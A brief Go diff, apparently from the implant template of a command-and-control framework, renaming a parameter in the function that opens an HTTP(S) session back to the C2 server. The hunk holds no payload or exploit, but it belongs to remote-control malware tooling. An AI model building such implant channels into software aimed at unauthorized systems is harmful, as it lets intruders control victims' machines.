@@ -423,13 +423,13 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 // {{end}} -WGc2Enabled
 
 // {{if .Config.HTTPc2Enabled}}
-func httpConnect(c2URI *url.URL) (*Connection, error) {
+func httpConnect(uri *url.URL) (*Connection, error) {
 
 	// {{if .Config.Debug}}
-	log.Printf("Connecting -> http(s)://%s", c2URI.Host)
+	log.Printf("Connecting -> http(s)://%s", uri.Host)
 	// {{end}}
-	opts := httpclient.ParseHTTPOptions(c2URI)
-	client, err := httpclient.HTTPStartSession(c2URI.Host, c2URI.Path, opts)
+	opts := httpclient.ParseHTTPOptions(uri)
+	client, err := httpclient.HTTPStartSession(uri.Host, uri.Path, opts)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("http(s) connection error %v", err)
